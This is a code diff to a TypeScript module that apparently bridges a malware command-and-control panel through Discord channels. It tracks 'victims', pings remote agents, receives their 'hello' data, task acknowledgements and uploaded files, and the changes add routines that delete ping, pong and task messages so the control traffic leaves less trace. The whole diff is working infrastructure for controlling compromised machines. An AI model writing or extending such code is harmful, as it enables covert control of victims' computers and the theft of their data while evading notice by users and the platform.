@@ -32,7 +32,9 @@ type Message = {
 
 const API = 'https://discord.com/api/v10';
 const POLL_MS = 4000;
-const PING_MS = 120_000;
+// A slow channel only needs presence occasionally; 120 s created too much
+// noise and Discord traffic when several agents were offline.
+const PING_MS = 600_000;
 const PART_RE = /^(.*)\.part(\d{3,})$/;
 
 let token = '';
@@ -88,10 +90,38 @@ async function rest<T>(method: string, path: string, body?: unknown, raw = false
     throw new Error(`discord ${method} ${path} -> ${response.status}`);
   }
   if (raw) return (await response.arrayBuffer()) as T;
-  return (await response.json()) as T;
+  if (response.status === 204) return undefined as T;
+  const text = await response.text();
+  return (text ? JSON.parse(text) : undefined) as T;
 }
 
 const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
+
+/** Deletes bridge traffic so presence never piles up in a channel. */
+async function removeMessage(channelId: string, messageId: string): Promise<void> {
+  try {
+    await fetch(`${API}/channels/${channelId}/messages/${messageId}`, {
+      method: 'DELETE',
+      headers: { authorization: `Bot ${token}` }
+    });
+  } catch {
+    // a missing message is already clean
+  }
+}
+
+async function cleanupPings(channelId: string): Promise<void> {
+  try {
+    const messages = await rest<Message[]>('GET', `/channels/${channelId}/messages?limit=100`);
+    const ids = messages.filter((message) => message.content === 'ping').map((message) => message.id);
+    if (ids.length === 1) {
+      await removeMessage(channelId, ids[0]!);
+    } else if (ids.length > 1) {
+      await rest('POST', `/channels/${channelId}/messages/bulk-delete`, { messages: ids });
+    }
+  } catch {
+    // cleanup is best effort
+  }
+}
 
 export function bridgeConfigured(): boolean {
   return Boolean(token && guildId);
@@ -126,6 +156,9 @@ export async function startDiscordBridge(): Promise<boolean> {
     running = true;
     log(`connected as ${botId} on guild ${guildId}`);
     await runBridgeBootstrap();
+    for (const link of await prisma.discordLink.findMany({ select: { channelId: true }, take: 100 })) {
+      await cleanupPings(link.channelId);
+    }
     schedule(1000);
     return true;
   } catch (error) {
@@ -355,7 +388,12 @@ async function handleMessage(link: { channelId: string; victimId: string }, mess
     await prisma.event.create({ data: { victimId: link.victimId, kind: 'hello', data: { fields: Object.fromEntries(fields) } } });
   }
 
-  if (message.content) await handleText(link.victimId, message);
+  if (message.content) {
+    await handleText(link.victimId, message);
+    if (message.content.startsWith('pong') || isTaskQueuedAck(message.content)) {
+      void removeMessage(link.channelId, message.id);
+    }
+  }
   for (const attachment of message.attachments ?? []) {
     try {
       await handleAttachment(link, message, attachment);
@@ -678,10 +716,20 @@ async function maybePing(): Promise<void> {
   const links = await prisma.discordLink.findMany({ take: 100 });
   const now = Date.now();
   for (const link of links) {
-    if (now - (lastPing.get(link.channelId) ?? 0) < PING_MS) continue;
+    const previous = lastPing.get(link.channelId);
+    if (previous === undefined) {
+      // Don't ping every channel immediately after a restart.
+      lastPing.set(link.channelId, now);
+      continue;
+    }
+    if (now - previous < PING_MS) continue;
     try {
       const id = await send(link, 'ping');
-      if (id) lastPing.set(link.channelId, now);
+      if (id) {
+        lastPing.set(link.channelId, now);
+        // The pong has arrived by then; keep the channel free of old pings.
+        setTimeout(() => void removeMessage(link.channelId, id), 60_000);
+      }
     } catch {
       // channel lost
     }
